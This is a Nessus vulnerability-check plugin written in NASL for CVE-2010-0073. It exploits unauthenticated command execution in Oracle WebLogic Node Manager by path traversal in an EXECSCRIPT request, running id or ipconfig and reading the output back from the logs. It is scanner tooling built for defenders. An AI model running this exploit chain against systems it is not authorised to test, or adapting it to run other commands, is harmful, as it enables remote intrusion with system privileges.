#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(44316);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2010-0073");
  script_bugtraq_id(37926);
  script_osvdb_id(62033);

  script_name(english:"Oracle WebLogic Server Node Manager Remote Command Execution");
  script_summary(english:"Tries to execute a command");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote service allows execution of arbitrary code."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The version of Node Manager listening on this port allows
unauthenticated, remote attackers to execute arbitrary commands with
system privileges."
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?6aee3333"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?a7d02724"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Apply the fix referenced in Oracle's advisory."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"vuln_publication_date", value:"2010/01/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/01/26");
 script_cvs_date("$Date: 2015/11/22 05:41:41 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("weblogic_nodemanager_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/weblogic_nodemanager", 5556);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");


port = get_kb_item("Services/weblogic_nodemanager");
if (!port)
{
  if (service_is_unknown(port:5556)) port = 5556;
  else exit(0, "The host does not appear to be running Node Manager.");
}
if (!get_port_state(port)) exit(0, "Port "+port+" is not open.");


# Initialize some variables.
domains = make_list(
  'wl_server',
  'medrec',
  'workshop'
);

os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) cmd = '/WINDOWS/System32/ipconfig.exe';
  else cmd = '/usr/bin/id';

  cmds = make_list(cmd);
}
else
{
  cmds = make_list(
    '/WINDOWS/System32/ipconfig.exe',
    '/usr/bin/id'
  );
}
traversal = crap(data:"../", length:3*9) + '..';

cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig.exe"] = "Subnet Mask";


soc = open_sock_tcp(port);
if (!soc) exit(1, "Can't open socket on port "+port+".");


# Send a 'HELLO'.
req1 = 'HELLO ' + SCRIPT_NAME;
send(socket:soc, data:req1+'\n');
res1 = recv_line(socket:soc, length:1024);
if (strlen(res1) == 0) exit(1, "Service on port "+port+" failed to respond.");

res1 = chomp(res1);
if ("+OK Node manager v" >!< res1) exit(1, "Unexpected response from port "+port+" ("+res1+").");

# Find a valid domain.
valid_domain = "";
foreach domain (domains)
{
  req2 = 'DOMAIN ' + domain;
  send(socket:soc, data:req2+'\n');
  res2 = recv_line(socket:soc, length:1024);
  if (strlen(res2) == 0) exit(1, "Service on port "+port+" failed to respond.");

  if ('+OK Current domain set to ' >< res2)
  {
    valid_domain = domain;
    break;
  }
}

# If we have one...
errmsg = "";
report = "";

if (valid_domain) 
{
  # Try to exploit the vulnerability.
  foreach cmd (cmds)
  {
    # Add a marker so we can find our command output.
    marker = 'NESSUS_' + SCRIPT_NAME + '_' + unixtime();
    req3 = 'EXECSCRIPT ' + marker;
    send(socket:soc, data:req3+'\n');
    res3 = recv_line(socket:soc, length:1024);
    if (strlen(res3) == 0) exit(1, "Service on port "+port+" failed to respond.");

    if (
      report_paranoia < 2 && 
      'Unable to find file "'+marker+'" in the correct service migration' >!< res3
    )
    {
      errmsg = "Unexpected response to EXECSCRIPT message from port "+port+" ("+res3+").";
      break;
    }

    # Now the exploit.
    #
    # nb: running an interactive command such as Windows' CALC.exe will likely
    #     result in a timeout as EXECSCRIPT waits for the command to finish.
    script = traversal + cmd;
    req3 = 'EXECSCRIPT ' + script;
    send(socket:soc, data:req3+'\n');
    res3 = recv_line(socket:soc, length:1024);
    if (strlen(res3) == 0) exit(1, "Service on port "+port+" failed to respond.");

    if ("+OK Script '"+script+"' executed" >< res3)
    {
      req4 = 'GETNMLOG';
      send(socket:soc, data:req4+'\n');

      got_marker = FALSE;
      info = "";
      while (TRUE)
      {
        res4 = recv_line(socket:soc, length:1024);
        if (strlen(res4) == 0) exit(1, "Service on port "+port+" failed to respond.");
        res4 = chomp(res4);

        if (res4 == '.') break;

        if (got_marker && "<Info> <" >< res4)
        {
          info += ereg_replace(pattern:"^.+<Info> <(.*)>$", replace:"\1", string:res4) + '\n';
        }
        else if ('Unable to find file "'+marker+'" in the correct service migration' >< res4) got_marker = TRUE;
      }

      basename = ereg_replace(pattern:"^(.*/)?", replace:"", string:cmd);
      pat = cmd_pats[basename];
      if (os && "Windows" >< os) cmd = str_replace(find:'/', replace:'\\', string:cmd);

      if (strlen(info) && egrep(pattern:pat, string:info))
      {
        report = '\n' +
          "Nessus was able to execute the command '" + cmd + "' on the" + '\n' +
          'remote host by connecting to this port and sending the following\n' +
          'four messages :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          '  ' + req1 + '\n' +
          '  ' + req2 + '\n' +
          '  ' + req3 + '\n' +
          '  ' + req4 + '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

        if (report_verbosity > 1)
        {
          report += '\n' +
            'This produced the following output :\n' +
            '\n' +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
            info + '\n' +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
        }
      }
      else
      {
        report = '\n' +
               "Although Nessus did not find the expected output in Node Manager's" + '\n' +
               "logs, it appears possible based on Node Manager's responses to be" + '\n' +
               "able to execute the command '" + cmd + "' on the remote" + '\n' +
               'host by connecting to this port and sending the following four\n' +
               'messages :\n' +
               '\n' +
               crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
               '  ' + req1 + '\n' +
               '  ' + req2 + '\n' +
               '  ' + req3 + '\n' +
               '  ' + req4 + '\n' +
               crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
    }
    else if ('Unable to find file "'+script+'" in the correct service migration' >< res3)
    {
      if (os && "Windows" >< os) cmd = str_replace(find:'/', replace:'\\', string:cmd);
      report = '\n' +
        "Although Nessus was not able to execute the command '" + cmd + "'" + '\n' +
        'on the remote host, the vulnerability almost certainly exists and\n' +
        'is likely exploitable using a different command or path.\n' +
        '\n' +
        'Nessus tried connecting to this port and sending the following three\n' +
        'messages :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        '  ' + req1 + '\n' +
        '  ' + req2 + '\n' +
        '  ' + req3 + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        '\n' +
        'The third message resulted in the following response :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        '  ' + res3 + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }

    # We're done if we have a report that indicates execution was successful;
    # if it wasn't successful, we'll try another command.
    if (report && "Nessus was not able to execute" >!< report) break;
  }
}


# Be nice and disconnect cleanly. 
req = 'QUIT';
send(socket:soc, data:req+'\n');
res = recv_line(socket:soc, length:256);

close(soc);


# Report results.
if (valid_domain)
{
  if (report)
  {
    if (report_verbosity > 0) security_hole(port:port, extra:report);
    else security_hole(port);

    exit(0);
  }
  else if (errmsg) exit(1, errmsg);
  else exit(0, "The instance of Node Manager listening on port "+port+" is not affected.");
}
else exit(1, "Failed to find a valid domain for the instance of Node Manager listening on port "+port+".");
